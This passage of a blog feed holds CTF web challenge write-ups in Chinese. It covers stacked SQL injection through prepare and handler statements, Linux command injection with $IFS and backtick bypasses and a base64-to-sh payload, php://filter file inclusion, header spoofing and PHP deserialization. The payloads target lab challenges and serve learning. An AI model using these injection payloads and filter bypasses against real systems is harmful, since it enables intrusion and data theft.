            "content_html": "<p>很久没有碰 sql 注入了，最近几天复习了一下，顺便掌握了点新的知识。</p>\n<p>好多题的 wp 我都懒得写了，挑一两道写吧</p>\n<p><span id=\"more\"></span></p>\n<p>先推一下两篇很有帮助的文章，以后自己复习用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDMyMzkxNDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMiU3RWRlZmF1bHQtMS5jb250cm9sJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTIlN0VkZWZhdWx0LTEuY29udHJvbA==\">[强网杯 2019] 随便注 的三种解法</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgyL2FydGljbGUvZGV0YWlscy8xMDk4OTg5MzQ=\">MySQL 之 handler 的详细使用及说明</span></p>\n<h2 id=\"1强网杯-2019随便注\"><a class=\"anchor\" href=\"#1强网杯-2019随便注\">#</a> 1.[强网杯 2019] 随便注</h2>\n<p>1. 先试试万能密码  <code>1‘ or 1=1 #</code></p>\n<p>有回显，这说明可以注入：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvbU85NExhNkJjWHlRQWplLnBuZw==\">https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>做个 FUZZ 测试，不放图了，发现 select 等关键词都被 ban 了，无法联合，只能少量报错注入。</p>\n<p>因此考虑堆叠注入。</p>\n<p>查库名：</p>\n<pre><code class=\"language-mysql\">1'; show databases;#  \n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvTUZJNGJxUXV3SkxTR1hOLnBuZw==\">https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>查表名:</p>\n<pre><code class=\"language-mysql\">1'; show tables;#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdTVlelgxR0Nadk1ZeG9RLnBuZw==\">https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>显然 flag 应该在长的那串数字里，查列名:</p>\n<pre><code class=\"language-mysql\"> 1'; show columns from `1919810931114514`;#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvUVhod1BsQTRCazFheUdWLnBuZw==\">https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>flag 在这里，但是显示不出来 flag，很尴尬，于是学会了两个方法，</p>\n<p>第一种比较常规，第二种比较万能。</p>\n<p><strong>第一种：预编译</strong></p>\n<p>因为 select 被 ban 了，可以考虑 <strong>16 进制编码</strong>绕过，也可以考虑<strong>拼接语句</strong>绕过，我用了拼接语句。</p>\n<p>先构造语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">`</span><span class=\"token number\">1919810931114514</span><span class=\"token punctuation\">`</span></pre></td></tr></table></figure><p>进行预编译：</p>\n<pre><code class=\"language-mysql\">1'; SET @a= concat('sel','ect','* from `1919810931114514`'); prepare flag from @a; execute flag;#\n</code></pre>\n<p>注释一下：</p>\n<ol>\n<li>定义：    SET @变量 = 语句（命令）</li>\n<li>预编译：   prepare name from 语句</li>\n<li>执行：   excute name</li>\n</ol>\n<hr>\n<p><strong>第二种：handler 方法</strong></p>\n<p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到 SQL 标准中。</p>\n<p><strong>此处需要用到的语法：</strong></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdkxGaDllTXFhNkRDOE9XLnBuZw==\">https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>构造 payload：</p>\n<pre><code class=\"language-mysql\">1'; handler `1919810931114514` open as a; handler a read first;#\n</code></pre>\n<p>随便哪个 payload 都可得到 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdUxleHI1cDYzQ1VzUW13LnBuZw==\">https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>另外本题还能通过改名和 mysql 约束去做，感觉太麻烦了，没学。。</p>\n<hr>\n<p>后面遇到堆叠注入和预编译的题再补上，就这样</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://example.com/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "(ctfwp)网站中linux命令执行",
            "date_published": "2021-07-27T13:45:24.931Z",
            "content_html": "<p>这类的题不算多，在这里稍微总结一下</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"gxyctf2019ping-ping-ping\"><a class=\"anchor\" href=\"#gxyctf2019ping-ping-ping\">#</a> [GXYCTF2019]Ping Ping Ping</h1>\n<p>第一次做这种题，有思路但缺少经验，所以没做出来，下面是 wp。</p>\n<p>进去界面什么都没有，只有  /?ip=</p>\n<p>查看源码无果，抓包无果，尝试输入 /?ip=1</p>\n<p>有结果 根据提示：ping</p>\n<p>考虑是 linux 命令，尝试查看目录  /?ip=1;ls</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/wk9qAWMTK8dtsyU.png\" alt=\"1.1.png\">&lt;!--p1--&gt;</p>\n<p>根据结果 cat flag.php，结果不让看，提示猜测应该是过滤了空格</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/bm2O53pIYcLjNzw.png\" alt=\"1.2.png\">&lt;!--p2--&gt;</p>\n<p>经过百度后，发现有以下几种绕过过滤空格的方式：</p>\n<blockquote>\n<ol>\n<li>${IFS} 替换</li>\n<li>$IFS$1 替换</li>\n<li>${IFS 替换</li>\n<li>%20 替换</li>\n<li>&lt;和 &lt;&gt; 重定向符替换</li>\n<li>%09 替换</li>\n</ol>\n</blockquote>\n<p>尝试第一种不行，<strong>(这里我提前做了下 FUZZ 测试，就不放图了，因为我看大佬都没用)</strong> 发现 {} 等等都被过滤了</p>\n<p>于是用第二种</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/gxF3pWdyJhYZwlc.png\" alt=\"1.3.png\">&lt;!--p3--&gt;</p>\n<p>发现 flag 被过滤了，查阅资料后，发现两张方式最合适。</p>\n<p><strong>第一种最常规：</strong>  命令执行拼接</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>a<span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1fla</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span>php</pre></td></tr></table></figure><p>原理就是 linux 命令的拼接，让 a=g，然后将 flag 换为 fla$a</p>\n<p><strong>第二种最牛逼：</strong>  内联绕过</p>\n<p>内联，就是将反引号内命令的输出作为输入执行。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1</span><span class=\"token string backtick-quoted-string\">`ls`</span></pre></td></tr></table></figure><p>ls 输出的内容直接被执行了</p>\n<p>flag 如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/OYtxEreBvki36Vm.png\" alt=\"1.4.png\">&lt;!--p4--&gt;</p>\n<hr>\n<p>另外我还学到了一些其他的方法，可能本题不适用，但也很常见。</p>\n<p><strong>单引号、双引号绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca\"t fl<span class=\"token string\">''</span>ag</pre></td></tr></table></figure><p><strong>反斜线绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca<span class=\"token punctuation\">\\</span>t fl<span class=\"token punctuation\">\\</span>ag</pre></td></tr></table></figure><p><strong>$1、$2 等和 $@绕过</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token variable\">$1at</span> gh<span class=\"token variable\">$@</span>twf01.txt</pre></td></tr></table></figure><p>如果<strong> cat 被过滤</strong>，可以用下边的方法进行绕过～～</p>\n<pre><code>(1)more:一页一页的显示档案内容\n\n(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页\n\n(3)head:查看头几行\n\n(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\n\n(5)tail:查看尾几行\n\n(6)nl：显示的时候，顺便输出行号\n\n(7)od:以二进制的方式读取档案内容\n\n(8)vi:一种编辑器，这个也可以查看\n\n(9)vim:一种编辑器，这个也可以查看\n\n(10)sort:可以查看\n\n(11)uniq:可以查看\n\n(12)file -f:报错出具体内容\n</code></pre>\n<hr>\n<p>本题还可以用</p>\n<p><strong>sh，bash 下编码</strong></p>\n<p>payload：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo$IFS$1Y2F0IGZsYWcucGhw<span class=\"token operator\">|</span>base64$IFS$<span class=\"token number\">1</span><span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>sh</pre></td></tr></table></figure><p>Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码</p>\n<pre><code class=\"language-sh\">echo&quot;str&quot; | base64 -d\n将base64编码的字符串str+换行 解码输出\n</code></pre>\n<p>|sh 是以 sh 运行，不是 bash。</p>\n<p>具体参考下面这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2VzbW8xOTg5L2FydGljbGUvZGV0YWlscy81MTA5MzQ4OQ==\">Linux base64 -- 用 base64 编解码</span></p>\n<hr>\n<p>另外，常见的管道符还有 <code>||</code>    <code> ;</code>   如果做不出来可以尝试下其他的。</p>\n<hr>\n<p>有新题我会补两道</p>\n<p>END</p>\n",
            "tags": [
                "命令执行"
            ]
        },
        {
            "id": "http://example.com/2021/07/27/ctf/web/file/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/",
            "url": "http://example.com/2021/07/27/ctf/web/file/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/",
            "title": "(ctfwp)伪协议文件包含漏洞",
            "date_published": "2021-07-27T09:46:52.065Z",
            "content_html": "<p>很久没写了，随便写写，一切从简吧，最近搞 python 比较多。</p>\n<p>主要是记录一下新知识。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019secret-file\"><a class=\"anchor\" href=\"#1极客大挑战-2019secret-file\">#</a> 1.[极客大挑战 2019] Secret File</h1>\n<p>进去先探索一下，没啥有用的，看源码，根据提示走。</p>\n<p>发现第三步直接被跳过了，直接 end 了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvcEJJbzN3bkRaOWE3YktWLnBuZw==\">https://i.loli.net/2021/07/27/pBIo3wnDZ9a7bKV.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>用 F12 看了半天没啥名堂，只能抓包确实能抓到东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvdzhJMldudUtEYlV6UkNhLnBuZw==\">https://i.loli.net/2021/07/27/w8I2WnuKDbUzRCa.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>于是顺藤摸瓜打开网页，提示 flag 在 flag.php 里，但是打开后显示不出来：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvZHQzVnJIbkFqSzd5dXB6LnBuZw==\">https://i.loli.net/2021/07/27/dt3VrHnAjK7yupz.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>前面还有个过滤，但是没有过滤 filter，考虑伪协议：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token argument-name\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><p>得到 base64，解密得到 flag。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvNjFwTjlmenFkcmlnSjJ0LnBuZw==\">https://i.loli.net/2021/07/27/61pN9fzqdrigJ2t.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<hr>\n<h1 id=\"2actf2020-新生赛include\"><a class=\"anchor\" href=\"#2actf2020-新生赛include\">#</a> 2.[ACTF2020 新生赛] Include</h1>\n<p>进去只有一个 tip，点开不难发现，是一个文件读取的方式读处的数据：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvV1FoN2piZDY4bHEyeHRvLnBuZw==\">https://i.loli.net/2021/07/27/WQh7jbd68lq2xto.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>结合本题题目，考虑伪协议，文件包含。</p>\n<p>我自己做的时候还抓了一下包，确实没有什么其他方法。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token argument-name\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><p>得到 base64，解密得到 flag。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvVFNkekk2Q0QxWXJHSlVtLnBuZw==\">https://i.loli.net/2021/07/27/TSdzI6CD1YrGJUm.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<hr>\n<p>有新题我会继续补两道</p>\n<p>END</p>\n",
            "tags": [
                "文件包含"
            ]
        },
        {
            "id": "http://example.com/2021/07/08/ctf/web/http/(ctfwp)http&java/",
            "url": "http://example.com/2021/07/08/ctf/web/http/(ctfwp)http&java/",
            "title": "(ctfwp)http&java",
            "date_published": "2021-07-08T14:30:37.254Z",
            "content_html": "<p>最近遇到不少奇奇怪怪的题，方法很少见且唯一，直接总结一下。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019http\"><a class=\"anchor\" href=\"#1极客大挑战-2019http\">#</a> 1.[极客大挑战 2019] Http</h1>\n<p>进去后是个介绍页面，由于没有信息，先查看源码</p>\n<p>发现相关信息，看名字可能与答案有关：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvNzVpU09GS2h1THZFcXp4LnBuZw==\">https://i.loli.net/2021/07/09/75iSOFKhuLvEqzx.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>点进去后界面如下：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvUWF5dVdyRDVQWHZaMjhvLnBuZw==\">https://i.loli.net/2021/07/09/QayuWrD5PXvZ28o.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>根据网页提示，应该在头请求里修改 referer，这里有很多方法（burp 抓包添加，火狐 F12 网络里拦截修改，hackbar 修改）</p>\n<p>我都已尝试过了，所以这里用最简单的 hackbar：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvSjcyeFZPOUkzcmh3UzVGLnBuZw==\">https://i.loli.net/2021/07/09/J72xVO9I3rhwS5F.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>界面如下，根据提示，要通过 Syclover 浏览，所以修改 user-agent：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvYmVOUTdwOEpMd21PQjJ6LnBuZw==\">https://i.loli.net/2021/07/09/beNQ7p8JLwmOB2z.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>界面如下，再根据提示，需要本地查看</p>\n<p>在简单的学习后，发现通过 X-Forwarded-For:127.0.0.1 可以伪造 ip 地址到本地</p>\n<p>（顺便学习了一下 html 请求头和响应头，相关文章附到后文）</p>\n<p>此时不能用 hackbar 添加，所以我选择用火狐工具直接修改：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvYUR0UGJ5V3M3RjFyWWpRLnBuZw==\">https://i.loli.net/2021/07/09/aDtPbyWs7F1rYjQ.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvQWJIMmtKcUVLMWVDeDRTLnBuZw==\">https://i.loli.net/2021/07/09/AbH2kJqEK1eCx4S.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<h1 id=\"2roarctf-2019easy-java\"><a class=\"anchor\" href=\"#2roarctf-2019easy-java\">#</a> 2.[RoarCTF 2019]Easy Java</h1>\n<p>这题真是没见过就不会做，进去先注入了几下，没有；扫目录，没有，点开 help，考虑是利用了 download 下载了啥东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvVEdLSVlPOVhSM1daRmkyLnBuZw==\">https://i.loli.net/2021/08/09/TGKIYO9XR3WZFi2.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>然后就没思路了，被迫看了眼 wp：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvNHdTbDJ2MzFaa1lUV2RuLnBuZw==\">https://i.loli.net/2021/08/09/4wSl2v31ZkYTWdn.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>确实有漏洞，能带出源码，虽然我没听过，所以我查了一下相关资料：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3L2FydGljbGUvZGV0YWlscy83ODE2NTA1MQ==\">ctf/web 源码泄露及利用办法</span></p>\n<p>nb，继续做题：</p>\n<p>这里 get 下载不下来东西，burp 抓包后用 post 下载 web-xml (通过 WEB-INF)：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvbU5KaWFiV0Q4UjRRUEt2LnBuZw==\">https://i.loli.net/2021/08/09/mNJiabWD8R4QPKv.png</span>&quot; alt=&quot;9.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>根据漏洞说明，找到相关的 class 文件，下载（就是我图中画出来的文件）：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvcW9lVzdHWEhjZjVSODFTLnBuZw==\">https://i.loli.net/2021/08/09/qoeW7GXHcf5R81S.png</span>&quot; alt=&quot;10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<p>得到 base64 加密后的 flag，结束</p>\n<p>说实话这题挺简单，主要靠经验做，但是像我这种 cj，直接傻眼。。</p>\n<hr>\n<h1 id=\"附参考文章\"><a class=\"anchor\" href=\"#附参考文章\">#</a> 附：参考文章</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2x2Y2hlbi9wLzEwMTY5MjQ1Lmh0bWw=\">HTML 请求头，响应头和 HTTP 状态码</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9odHRwL2h0dHAtbWV0aG9kcy5odG1s\">菜鸟教程 HTTP 请求方法</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aW5kYXJkLmNvbS9wcm9qZWN0LzIwMTYvMDUvMDgvRm9yZ2UtSVAtQWRkcmVzcw==\">通过修改 http 请求的 header 请求头来伪造 ip</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3L2FydGljbGUvZGV0YWlscy83ODE2NTA1MQ==\">ctf/web 源码泄露及利用办法</span></p>\n<hr>\n<p>遇到类似的的奇怪题再总结</p>\n<p>END</p>\n",
            "tags": [
                "http"
            ]
        },
        {
            "id": "http://example.com/2021/07/04/ctf/web/pop/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://example.com/2021/07/04/ctf/web/pop/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "(ctfwp)buu中php反序列化",
            "date_published": "2021-07-04T14:48:57.312Z",
            "content_html": "<p>上一篇整理了 php 反序列化的知识点，本文是我对练习中题目的整理。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019php\"><a class=\"anchor\" href=\"#1极客大挑战-2019php\">#</a> 1.[极客大挑战 2019] PHP</h1>\n<p>进入页面，根据提示，考虑备份导致源码泄露。</p>\n<p>于是用扫描工具（ctfwscan）进行目录扫描，发现备份文件可以成功访问，如图</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvT3V2YnNjcTV6bjRFODYxLnBuZw==\">https://i.loli.net/2021/07/04/Ouvbscq5zn4E861.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>然后下载下来，打开，有五个文件：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvSDRCRWFPWDE4cVlMb2tBLnBuZw==\">https://i.loli.net/2021/07/04/H4BEaOX18qYLokA.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>尝试 flag.php 后不对，审计 class.php 和 index.php，找到了可反序列化点</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvbGJCb0dmNFluUjN5SXpLLnBuZw==\">https://i.loli.net/2021/07/04/lbBoGf4YnR3yIzK.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>因为包含了 class.php 文件，所以审计 class.php</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvM2dtTXZ1WVpXajVpcG43LnBuZw==\">https://i.loli.net/2021/07/04/3gmMvuYZWj5ipn7.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>class 中没有调用类，根据 index 中代码，只是进行了反序列化。</p>\n<p>根据流程分析，先__wakeup ()，然后__destruct ()。</p>\n<p>在 destruct () 中，当 password == 100，username === admin 时，能读取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvbEd6SHNLSlF5ajRobUUyLnBuZw==\">https://i.loli.net/2021/07/04/lGzHsKJQyj4hmE2.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>但是在 wakeup () 时，username 会被赋值为 guest，会使我们输入的值改变，导致无法获取答案。</p>\n<p>此时我们只需改对象属性个数绕过 wakeup () 即可：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/qfRyJZDdMrTK4SC.png\" alt=\"1.6.png\">&lt;!--p6--&gt;</p>\n<p>打入 payload，得到 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvRjI2eXY1c0pnbHdUWHJ4LnBuZw==\">https://i.loli.net/2021/07/04/F26yv5sJglwTXrx.png</span>&quot; alt=&quot;1.7.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<hr>\n<h1 id=\"2网鼎杯-2020-青龙组areuserialz\"><a class=\"anchor\" href=\"#2网鼎杯-2020-青龙组areuserialz\">#</a> 2.[网鼎杯 2020 青龙组] AreUSerialz</h1>\n<p>据说是当年的签到题，作为一个新手，当然要玩一下</p>\n<p>进去直接给了原码，先复制到本地，找反序列化点：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvU2REbjQyQ3hIUUdZQWFQLnBuZw==\">https://i.loli.net/2021/07/04/SdDn42CxHQGYAaP.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>&lt;!--p1--&gt;</p>\n<p>然后审计代码，同第一题，但没有 wakeup ()，如果反序列化直接会 destruct ()</p>\n<p>但再反序列化前，需要先绕过 is_valid () 中的 ascll 检查（私有类需要 %00）</p>\n<p>在 destruct () 中，当 op === &quot;2&quot; 时，会被强制为 &quot;1&quot;，当 op == &quot;1&quot; 时，沿着代码走下去发现只能写，不能读，无法找到 flag；而当 op == &quot;2&quot; 时，通过 file_get_contents () 函数可以读到 filename，如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" 